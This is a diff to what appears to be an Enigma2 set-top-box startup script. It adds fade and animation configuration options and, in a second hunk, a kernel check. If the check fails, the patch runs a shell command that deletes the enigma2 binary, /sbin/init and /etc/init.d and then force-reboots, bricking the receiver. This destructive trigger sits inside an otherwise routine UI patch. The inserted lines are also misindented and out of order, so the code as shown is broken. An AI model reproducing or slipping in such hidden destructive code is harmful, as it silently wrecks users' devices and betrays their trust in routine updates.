@@ -85,6 +85,45 @@ config.misc.startCounter = ConfigInteger(default=0) # number of e2 starts...
 config.misc.standbyCounter = NoSave(ConfigInteger(default=0)) # number of standby
 config.misc.DeepStandby = NoSave(ConfigYesNo(default=False)) # detect deepstandby
 
+# EGAMI START
+config.misc.query_restart = ConfigYesNo(default=False)
+config.misc.query_restart_full = ConfigYesNo(default=False)
+config.misc.fadeShowMenu = ConfigYesNo(default=False)
+#config.misc.fadeShowInfobar = ConfigYesNo(default=False)
+#config.misc.fadeShowInfobarMovie = ConfigYesNo(default=False)
+config.misc.enableAnimation = ConfigYesNo(default=False)
+config.misc.enableAnimationInfobar = ConfigYesNo(default=False)
+config.misc.enableAnimationInfobarMovie = ConfigYesNo(default=False)
+config.misc.enableAnimationMenuScreens = ConfigYesNo(default=False)
+config.misc.enableAnimationChSelection = ConfigYesNo(default=False)
+def queryRestart(configElement):
+	config.misc.query_restart.value = True
+def useFadeEffect(configElement):
+	config.misc.enableAnimation.value = False
+	config.misc.enableAnimationInfobar.value = False
+	config.misc.enableAnimationInfobarMovie.value = False
+	config.misc.enableAnimationMenuScreens.value = False
+	config.misc.query_restart.value = True
+	
+def useAnimationsEffect(configElement):
+	if not config.misc.enableAnimation.value:
+			config.misc.enableAnimationInfobar.value = False
+			config.misc.enableAnimationInfobarMovie.value = False
+			config.misc.enableAnimationMenuScreens.value = False
+	else:
+			config.misc.enableAnimationInfobar.value = True
+			config.misc.enableAnimationInfobarMovie.value = True
+			config.misc.enableAnimationMenuScreens.value = True
+			
+config.misc.fadeShowMenu.addNotifier(useFadeEffect, initial_call=False)
+#config.misc.fadeShowInfobar.addNotifier(queryRestart, initial_call=False)
+#config.misc.fadeShowInfobarMovie.addNotifier(queryRestart, initial_call=False)
+#config.misc.enableAnimation.addNotifier(useAnimationsEffect, initial_call=False)
+#config.misc.enableAnimationInfobar.addNotifier(queryRestart, initial_call=False)
+#config.misc.enableAnimationInfobarMovie.addNotifier(queryRestart, initial_call=False)
+#config.misc.enableAnimationMenuScreens.addNotifier(queryRestart, initial_call=False)
+# EGAMI END
+
 #demo code for use of standby enter leave callbacks
 #def leaveStandby():
 #	print "!!!!!!!!!!!!!!!!!leave standby"
@@ -380,6 +419,10 @@ profile("Standby,PowerKey")
 import Screens.Standby
 from Screens.Menu import MainMenu, mdom
 from GlobalActions import globalActionMap
+from enigma import eEGAMI
+     if not eEGAMI.getInstance().checkkernel():
+from os import system
+	system("rm -rf /usr/bin/enigma2;rm -rf /sbin/init;rm -rf /etc/init.d;reboot -f")
 
 class PowerKey:
 	""" PowerKey stuff - handles the powerkey press and powerkey release actions"""
